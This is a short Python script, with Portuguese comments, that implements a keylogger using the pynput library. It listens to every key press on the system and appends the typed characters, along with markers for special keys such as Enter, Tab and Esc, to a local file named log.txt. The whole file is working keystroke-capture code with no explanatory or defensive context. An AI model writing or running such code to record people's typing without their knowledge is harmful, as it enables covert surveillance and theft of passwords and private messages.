from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt_l,
    keyboard.Key.alt,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd    
}

def on_press(key):
    try:
        #se for uma tecla normal(letra, numero, simbolo)
        
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char) 
    
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.tab:
                 file.write("\t")
            elif key == keyboard.Key.backspace:
                file.write(" ")
            elif key == keyboard.Key.esc:
                file.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                file.write(f"[{key}]")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
